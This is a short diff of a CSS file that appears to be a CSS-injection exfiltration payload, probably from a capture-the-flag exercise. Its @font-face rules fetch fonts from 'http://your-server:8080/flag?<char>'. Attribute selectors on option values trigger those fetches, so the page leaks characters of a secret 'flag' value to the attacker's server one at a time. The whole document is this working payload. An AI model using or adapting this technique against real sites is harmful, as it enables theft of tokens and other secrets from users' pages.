@@ -1,17 +1,9 @@
 @charset "UTF-8";
 
 @font-face {
-    font-family: "flag-_";
-    src: url("http://your-server:8080/flag?_");
+    font-family: "flag-v";
+    src: url("http://your-server:8080/flag?v");
 }
-option[value*="\_"] {
-    font-family: "flag-_";
-}
-
-@font-face {
-    font-family: "flag--";
-    src: url("http://your-server:8080/flag?-");
-}
-option[value*="\-"] {
-    font-family: "flag--";
+option[value*="v"] {
+    font-family: "flag-v";
 }
